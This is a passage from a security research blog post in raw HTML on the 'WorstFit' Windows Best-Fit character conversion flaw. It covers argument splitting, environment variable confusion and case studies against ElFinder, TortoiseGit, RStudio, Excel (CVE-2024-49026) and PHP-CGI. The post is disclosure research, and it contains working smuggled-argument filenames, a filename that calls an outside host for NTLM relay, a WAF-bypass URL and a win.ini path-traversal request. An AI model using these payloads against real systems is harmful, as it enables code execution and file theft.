&lt;p&gt;Therefore, standard libraries and functions in most programming languages adhere to these parsing rules to sanitize user-provided arguments.  For instance, in &lt;strong&gt;PHP&lt;/strong&gt;, the &lt;a href=&quot;https://www.php.net/manual/en/function.escapeshellarg.php&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escapeshellarg&lt;/code&gt;&lt;/a&gt; function replaces double quotes with spaces, wraps the argument in quotes, and escapes backslashes as needed to ensure safe execution in the shell.  Similarly, in &lt;strong&gt;Python&lt;/strong&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module internally uses the &lt;a href=&quot;https://github.com/python/cpython/blob/v3.12.8/Lib/subprocess.py#L576&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list2cmdline&lt;/code&gt;&lt;/a&gt; function to convert a Python list into a command line string, escaping arguments strictly according to the Microsoft CRT command-line parsing logic.&lt;/p&gt;

&lt;p&gt;However, all of this escaping happens before the Best-Fit feature comes into play. This means that even carefully escaped arguments can still be altered during the ANSI conversion process.&lt;/p&gt;

&lt;p&gt;Hereâ€™s a simple example. Using the example Python code we provided, letâ€™s examine what happens when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget.exe&lt;/code&gt; is spawned with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module. The entire argument parsing process would look something like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we saw, fullwidth quotation marks (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) are transformed into regular double quotes (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+0022&lt;/code&gt;) during the Best-Fit conversion process. This subtle alteration changes the original command-line syntax, enabling argument-splitting behavior.&lt;/p&gt;

&lt;p&gt;Furthermore, even programs that donâ€™t directly use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt; can still be vulnerable to this attack if they rely on the non-Unicode version of the main function. Yes, weâ€™re talking about the &lt;strong&gt;innocent-looking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt;&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;Here we can do a small experiment. Given this piece of code&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;argv[%d] = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, when we run the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.\test.exe &quot;fooï¼‚ ï¼‚bar&quot;&lt;/code&gt;, it does produce two arguments, as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And yes, Pythonâ€™s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt; module canâ€™t prevent this. Even if the entire string is passed as a single list element, it still ends up being parsed into two separate arguments.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The reason a normal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function becomes vulnerable lies in how the &lt;strong&gt;C runtime (CRT)&lt;/strong&gt; handles command-line arguments.  Even if you donâ€™t explicitly call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;, once you use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int main()&lt;/code&gt; function, the compiler secretly generates a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mainCRTStartup&lt;/code&gt; function inside your binary for you. This startup function is linked to the C runtime library (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ucrtbase.dll&lt;/code&gt;), which internally retrieves the command line using an ANSI API and parses it for you. And thatâ€™s where the vulnerability creeps in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is why so many executables are exposed to WorstFit vulnerabilities. Worse still, as the attack exploits behavior at the system level during the conversion process, &lt;strong&gt;no standard library in any programming language can fully stop our attack!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;However, only on 125x and 874 code pages does the fullwidth quotation mark (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;) get converted into a normal double quote. So, what about CJK (Chinese, Japanese and Korean) languages? Are they safe now? Not entirely. Double quote is NOT the only character we can use for this attack!&lt;/p&gt;

&lt;p&gt;As mentioned in the &lt;strong&gt;Filename Smuggling&lt;/strong&gt; section, the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00A5&lt;/code&gt;) on the Japanese (932) code page and the Won sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+20A9&lt;/code&gt;) on the Korean (949) code page are both converted into a &lt;strong&gt;backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;)&lt;/strong&gt;. And what can a backslash do? Quite a lot! As weâ€™ve discussed, the backslash is crucial for escaping characters and altering the syntax of a command line. This means it can be exploited to manipulate command execution.&lt;/p&gt;

&lt;p&gt;Letâ€™s take this Python code as an example:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;vuln.exe&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;fooÂ¥&quot; bar&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Here, Python handles escaping for us â€“ in this case, escaping the double quote. After escaping, the command line should look like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuln.exe &quot;fooÂ¥\&quot; bar&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Python prepends a backslash before the double quote to escape it. Everything seems fine, so Python passes this command line to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateProcessW&lt;/code&gt; API, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; spawns successfully. Great!&lt;/p&gt;

&lt;p&gt;However, hereâ€™s where it gets tricky. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; program uses an &lt;strong&gt;ANSI API&lt;/strong&gt; to retrieve the command line. Thanks to the Best-Fit feature (again ğŸ˜œ), the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Â¥&lt;/code&gt;) is converted into a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;). Now, the command line seen by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; becomes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuln.exe &quot;foo\\&quot; bar&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The backslash added by Python is now escaped by the â€œex-Yen-signâ€. As a result, that double quote is no longer properly escaped, allowing it to act as a delimiter. The arguments for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln.exe&lt;/code&gt; are now split into two parts: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo\&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bar&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note&lt;/strong&gt;: Of course, characters that can be converted into spaces or tabs can also be exploited for argument splitting. Iâ€™ll leave this part as an exercise for you ğŸ˜‰.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Now, we already explored most of the possible ways to exploit WorstFit for argument splitting. Letâ€™s dive into some real-world exploits and see this attack in action!&lt;/p&gt;

&lt;h4 id=&quot;-case-study-1---elfinder-rce-w-windows-built-in-gnu-tar&quot;&gt;â¤ Case Study 1 - ElFinder: RCE w/ Windows built-in GNU Tar&lt;/h4&gt;

&lt;p&gt;Here, one of our case studies highlights an RCE (Remote Code Execution) attack on &lt;a href=&quot;https://github.com/Studio-42/elFinder&quot;&gt;&lt;strong&gt;ElFinder&lt;/strong&gt;&lt;/a&gt;, caused by the WorstFit vulnerability in Windowsâ€™ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command.&lt;/p&gt;

&lt;p&gt;ElFinder is a popular open-source, web-based file manager with a PHP backend. By default, it supports Windows servers and comes with a built-in feature for creating and extracting archives, which is also enabled by default.&lt;/p&gt;

&lt;p&gt;The way it handles archive formats is straightforwardâ€”it directly executes shell commands.  Sounds risky? Perhaps. But the developers have taken precautions by escaping all arguments properly using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escapeshellarg&lt;/code&gt; (&lt;a href=&quot;https://github.com/Studio-42/elFinder/blob/7544918a2ba656a4fe72a6fc8bb502d39f601cda/php/elFinderVolumeDriver.class.php#L6898-L6911&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php/elFinderVolumeDriver.class.php#L6898-L6911&lt;/code&gt;&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despite this effort, escaping at the application level might not fully mitigate risks if quirks like the Best-Fit feature in Windows are involved.&lt;/p&gt;

&lt;p&gt;One of the archive formats supported by ElFinder is the &lt;strong&gt;tar&lt;/strong&gt; format. It uses the systemâ€™s built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command to create or extract archives. For example, if we create an archive named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foobar.tar&lt;/code&gt; containing the files &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo.txt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bar.txt&lt;/code&gt;, ElFinder would just execute the following command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe -chf &quot;foobar.tar&quot; &quot;.\foo.txt&quot; &quot;.\bar.txt&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;However, we discovered that the Windows built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt; command is vulnerable to the &lt;strong&gt;WorstFit&lt;/strong&gt; attack! This means that if you can control even a small part of an argument, itâ€™s possible to execute arbitrary commands. For details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/tar/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;To exploit this, we can simply name the tar file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaaï¼‚ ï¼‚--use-compress-program=calcï¼‚ ï¼‚bbb.tar&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ï¼‚&lt;/code&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+FF02&lt;/code&gt;). This injects the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--use-compress-program&lt;/code&gt; parameter, which allows arbitrary command execution. In our demonstration, this results in popping up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt;.&lt;/p&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/DPIp42-Ls0U?si=dczou7dD-p4CSOQ9&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;blockquote&gt;
  &lt;p&gt;In this demonstration, we use an English-configured Windows server (Code Page 1252) as an example. This technique should also work on other 125x code pages and Code Page 874 configurations.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;-case-study-2---all-the-ways-to-code-execution&quot;&gt;â¤ Case Study 2+ - All the Ways to Code Execution&lt;/h4&gt;

&lt;p&gt;Of course, there are more applications are indirectly exposed to WorstFit vulnerabilities because they invoke other executables that are themselves vulnerable to this. Here we demonstrate two examples:&lt;/p&gt;

&lt;p&gt;The first one involves a modified version of plink.exe used in &lt;strong&gt;TortoiseGit&lt;/strong&gt;. When a user enters a malicious URI for cloning, it can trigger code execution. For details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/plink/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/EF1U-C0e_9E?si=oEKebidfQ1hRIead&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;The second example involves &lt;strong&gt;RStudio&lt;/strong&gt;, which supports version control with SVN. If an SVN project is placed in a maliciously crafted folder, a single click can trigger a calculator to pop up on the userâ€™s machine! For more details, check out our &lt;a href=&quot;https://worst.fit/worstfit/Arg-Splitting/SVN/&quot;&gt;curated list&lt;/a&gt;.&lt;/p&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/YKw4ZcQ75Hc?si=Gd6pZ7r4wLToX15m&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h4 id=&quot;-case-study-3---microsoft-excel-remote-code-execution-cve-2024-49026&quot;&gt;â¤ Case Study 3 - Microsoft Excel Remote Code Execution &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026&quot;&gt;CVE-2024-49026&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;While re-mounting Argument Injection to applications, we discovered that the Argument Splitting attack can be combined with the â€œOpen-Withâ€ feature to escalate its impact!&lt;/p&gt;

&lt;p&gt;Windows actually maintains a handler table to know which program to use to open a file when you double-click a file. You can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ftype&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;assoc&lt;/code&gt; to see which programs handle specific file extensions. The filename would also become part of the argument, which means we can apply our attack through that!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We then discovered that the executable of Microsoft Excel is vulnerable to the Argument Splitting attack. We can just rename the Excel file to the following name - translating all dots, (back-)slashes, and double quote to their fullwidth forms.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼Windowsï¼win.iniï¼‚ ï¼n ï¼‚ï¼¼ï¼¼malicious.tld@80ï¼¼pwn.xlsx&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;By combining two tricks, we can trigger an Argument Injection on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Excel.exe&lt;/code&gt; with just 1-Click. Since Excel itself &lt;a href=&quot;https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6#Category=Excel&quot;&gt;doesnâ€™t have any good argument&lt;/a&gt; for further exploitation, we only use NTLM Relay along with RBCD/ADCS to achieve RCE!&lt;/p&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/zklkmbDyR1U?si=dLfxuwaO5U2En20n&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;em&gt;P.S. if you find a better argument that can directly lead to RCE, please let us know!&lt;/em&gt; ğŸ™‚&lt;/p&gt;

&lt;h3 id=&quot;-environment-variable-confusion&quot;&gt;ğŸ”¥ Environment Variable Confusion&lt;/h3&gt;

&lt;p&gt;When functions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentStringsA&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *getenv(const char *varname)&lt;/code&gt; are used, they return the &lt;strong&gt;Best-Fit&lt;/strong&gt; version of the environment variable. This subtle behavior can be exploited to bypass character restrictions, creating potential opportunities for attackers to slip through otherwise secure validations and introduce security vulnerabilities.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Relevant API&lt;/strong&gt;: &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *getenv(const char *varname)&lt;/code&gt;&lt;/a&gt;&lt;br /&gt;
&lt;strong&gt;Affected Code Pages&lt;/strong&gt;: No specific&lt;br /&gt;
&lt;strong&gt;Threat Characters&lt;/strong&gt;: No specific (for Apache HTTPd: 0x00-0xFF)&lt;/p&gt;

&lt;p&gt;For this exploit scenario, the environment variables must be user-controllable, which often occurs when a parent process needs to pass information to a spawned process.&lt;/p&gt;

&lt;p&gt;A common example is in &lt;strong&gt;CGI (Common Gateway Interface)&lt;/strong&gt;, where much of the HTTP request informationâ€”such as query strings, HTTP headers, and moreâ€”is passed through environment variables. This creates an opportunity for attackers to manipulate these variables and exploit the behavior. Here, we present two case studies as a starting point to spark your further ideas.&lt;/p&gt;

&lt;h4 id=&quot;-case-study-1---waf-bypass&quot;&gt;â¤ Case study 1 - WAF bypass&lt;/h4&gt;

&lt;p&gt;In some scenarios, a CGI script may act as a routing service. When this happens, the portion of the URL path after the CGI executable is stored in the environment variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt;. A common use case might involve a developer trying to restrict remote access to sensitive endpoints, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi.pl/admin&lt;/code&gt; from the web server, instead of the CGI itself. For example, in an Apache setup, they might add the following rule to deny access:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;/var/www/cgi-bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;%{REQUEST_URI} =~ m#/admin#&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;        &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
    &lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, due to the &lt;strong&gt;WorstFit vulnerability&lt;/strong&gt; in Perl on Windows, this rule can be bypassed by substituting characters in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; with their &lt;strong&gt;Best-Fit equivalents&lt;/strong&gt;. For instance, in &lt;strong&gt;Code Page 1250&lt;/strong&gt;, the character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ã &lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00E0&lt;/code&gt;) is converted to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt; during the ANSI conversion.&lt;/p&gt;

&lt;p&gt;By crafting a URL like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi.pl/%E0dmin&lt;/code&gt;, an attacker can bypass the Nginx rule, as the server interprets it as a different path, but Perlâ€™s CGI script retrieves the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; environment variable with ANSI API, and processes it as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/admin&lt;/code&gt; after the Best-Fit conversion.&lt;/p&gt;

&lt;h4 id=&quot;-case-study-2---php-cgi-local-file-inclusion-lfi&quot;&gt;â¤ Case study 2 - PHP-CGI Local File Inclusion (LFI)&lt;/h4&gt;

&lt;p&gt;The previous example was hypothetical, but hereâ€™s a real-world case we discovered. In &lt;strong&gt;PHP-CGI on Windows&lt;/strong&gt;, we identified a file existence check oracle and even a potential LFI (Local File Inclusion) vulnerability under certain configurations.&lt;/p&gt;

&lt;p&gt;The root cause lies in how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; â€” and other path-related environment variables â€” are handled. Letâ€™s break it down:&lt;/p&gt;

&lt;p&gt;Imagine a request URI like this:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://victim.tld/index.php/foo/bar&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;After the web server (e.g., IIS, Apache, or another PHP-CGI-compatible server) processes it, it generates several environment variables. Depending on the server, these might look like this in Apache:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;REDIRECT_URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
&lt;span class=&quot;nv&quot;&gt;REQUEST_URI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
&lt;span class=&quot;nv&quot;&gt;PATH_INFO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
&lt;span class=&quot;nv&quot;&gt;PATH_TRANSLATED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netpub&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;wwroot&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;ndex.php&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;oo&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notice how the PHP script filename (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;) and the additional path (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo/bar&lt;/code&gt;) are combined. From the environment variables alone, itâ€™s unclear which part represents the PHP file and which is additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt;. Resolving this ambiguity is left to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt;. Hmm, it must be quite easy to make &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi&lt;/code&gt; confused right?&lt;/p&gt;

&lt;p&gt;The first thought might be to try something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://victim.tld/index.php/../../../secret.txt&lt;/code&gt;. But this apparently wonâ€™t work, as the web server normalizes and validates paths before passing them to PHP-CGI. So, how can we bypass this?&lt;/p&gt;

&lt;p&gt;As we knew in the &lt;strong&gt;Filename Smuggling&lt;/strong&gt; section, the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Â¥&lt;/code&gt;) in the Japanese code page can be exploited. For example, by sending a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..Â¥..Â¥windows/win.ini/foo&lt;/code&gt;, you can potentially access arbitrary files. Hereâ€™s how it works:&lt;/p&gt;

&lt;ul&gt;
